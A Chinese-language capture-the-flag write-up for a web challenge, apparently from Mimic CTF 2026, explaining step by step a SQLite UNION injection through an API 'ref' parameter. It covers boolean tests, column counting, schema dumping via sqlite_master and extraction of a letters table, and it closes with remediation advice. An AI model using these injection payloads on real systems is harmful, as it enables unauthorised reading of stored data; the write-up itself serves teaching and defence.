# Postmarked: Never

[English](README.en.md) · Mimic CTF 2026 · Web · 100 分 · [题目页面](https://ctf.rarebytehub.com/events/mimic/writeups/challenge/postmarked-never)

| 分类 | 分值 | 输入 | 结果 |
|---|---:|---|---|
| Web | 100 | JSON API | SQLite UNION 注入 |

[原题与附件](PROMPT.md) · [官方题解](https://ctf.rarebytehub.com/events/mimic/writeups/official-solution-postmarked-never) · [历史实例](http://98.80.121.178:9001) · [赛事链接](../../OFFICIAL-LINKS.md)


页面只展示部分记忆，但 JavaScript 请求 `/api/v2/memory?ref=...&fmt=html`，由此找到真实查询接口。下面的响应差异来自官方题解，不通过错误信息臆造服务端源码。

## 1. 确认输入能成为表达式

先比较普通编号 `1` 与封存编号 `7`，再固定编号，只改变布尔条件：

```text
1 AND 1=1    返回正常匹配内容
1 AND 1=2    没有匹配内容
```

这对真、假条件支持 `ref` 被当作 SQL 表达式求值。官方流程不依赖原始 SQL 报错，也没有返回这样的报错。仅凭一次静默失败，无法确定数据库类型或列名。

## 2. 确认列数与可见列

用不存在的编号 `0` 避免原有记录干扰，再逐步增加 UNION 分支的表达式数量：

```sql
0 UNION SELECT 1--
0 UNION SELECT 1,2--
0 UNION SELECT 1,2,3--
```

一列和两列的版本未产生目标结果，三列版本显示 `3`。UNION 两边列数必须一致，因此该查询匹配三个表达式，第三列进入展示正文。注释用于终止可能存在的后续 SQL，不能据此判断被注释的源码究竟是什么。

## 3. 从数据库结构找到目标表

```sql
0 UNION SELECT name,2,sql FROM sqlite_master--
```

SQLite 结构目录返回建表定义，其中包含 `unsent_letters(id,addressed_to,body)`。这比根据故事猜表名更有依据，也不需要拼凑未经证实的基础查询。

## 4. 将信件正文放进第三列

```sql
0 UNION SELECT addressed_to,2,body FROM unsent_letters--
```

第三个表达式为 `body`。设置 `fmt=json` 时，它映射到输出的 `snippet` 字段；第一个表达式给出收信人。构造 URL 时，应将整段 SQL 编码为 `ref` 参数值。HTML 也能显示正文，JSON 只是更便于检查字段对应关系。

取回的信件包含：

```text
RBH{th3_1nk_0utl1v3d_th3_g00dbye}
```

## 本地模型与修复

```powershell
python src/solvers/postmarked-never/mechanism_demo.py
```

[SQLite 示例](../../../src/solvers/postmarked-never/mechanism_demo.py) 使用合成的 `DEMO_ONLY` 数据构造三列查询，对比字符串拼接与参数绑定。示例的表和查询是教学模型，不是恢复出的服务端源码。

使用参数绑定并校验编号类型，让输入只作为数据处理；同时独立检查每个返回对象的访问权限。绑定正确的查询仍可能有越权问题，展示过滤条件本身也不能定义谁有权读取信件。

[复现指南](../../REPRODUCIBILITY.md) · [来源与许可](../../ABOUT.md)
